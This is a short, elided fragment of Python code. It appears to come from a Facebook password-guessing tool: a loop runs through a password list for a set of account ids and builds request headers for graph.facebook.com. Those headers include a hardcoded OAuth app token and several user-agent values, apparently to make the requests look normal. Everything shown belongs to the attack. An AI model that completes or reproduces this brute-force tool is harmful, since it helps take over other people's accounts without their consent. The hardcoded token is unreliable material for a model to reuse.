...
def Fucking_life(ids, passlist):
    ...
    try:
        for pas in passlist:
            ...
            head = {'content-type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent': shahariar,'user-agent': pro,'user-agent': windows(),'accept-encoding': 'gzip, deflate','x-fb-http-engine': 'Liger'}
